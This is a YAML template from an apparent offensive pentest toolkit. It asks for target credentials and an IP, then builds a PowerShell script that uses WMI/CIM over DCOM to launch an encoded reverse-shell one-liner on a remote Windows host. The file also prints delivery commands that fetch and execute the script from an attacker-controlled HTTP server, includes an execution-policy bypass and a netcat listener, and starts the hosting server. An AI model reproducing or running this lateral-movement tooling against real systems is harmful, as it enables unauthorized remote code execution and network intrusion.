---
metadata:
  filename: "lateral-movement-template-WMI-powershell-revshell.yaml"
  tags: ["shell", "windows"]
  created: "2025-03-29"
  authors: ["Unknown"]

content: |
  printf '%s\n' "Answer the following with valid user credentials and a target ip. A powershell script will be generated. If successful, a revshell can be caught at port {{ shell_port }} of your kali."; \
  read --prompt-str "Target Username:" username; \
  read --prompt-str "Target Password:" password; \
  read --prompt-str "Target IP:" target; \

  echo "\$username = '$username';" > lateral-movement-wmi.ps1; \
  echo "\$password = '$password';" >> lateral-movement-wmi.ps1; \
  echo "\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;" >> lateral-movement-wmi.ps1; \
  echo "\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;" >> lateral-movement-wmi.ps1; \
  echo "\$Options = New-CimSessionOption -Protocol DCOM;" >> lateral-movement-wmi.ps1; \
  echo "\$Session = New-Cimsession -ComputerName $target -Credential \$credential -SessionOption \$Options;" >> lateral-movement-wmi.ps1; \
  echo "\$Command = '{{ include('payloads/revshell-windows-powershell-oneliner-base64encoded') }}';" >> lateral-movement-wmi.ps1; \
  echo "Invoke-CimMethod -CimSession \$Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =\$Command}" >> lateral-movement-wmi.ps1; \

  mkdir -p packstation/outbound; mv lateral-movement-wmi.ps1 packstation/outbound/; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      -----PowerShell-----                      '; \
  printf '%s\n' 'Preparation 1 (start listener): {{ include('scripts/listener-nc.yaml') }}'; \
  printf '%s\n' 'Without bypass: Open the created file lateral-movement-wmi.ps1 and paste in line by line into powershell'; \
  printf '%s\n' 'Preparation 2 (for save to disk only): powershell -ep bypass'; \
  printf '%s\n' 'Deliver & save to disk: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-wmi.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-wmi.ps1'; \
  printf '%s\n' 'Deliver, save to disk & execute: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-wmi.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-wmi.ps1; {{ delivery_path_windows }}\lateral-movement-wmi.ps1'; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
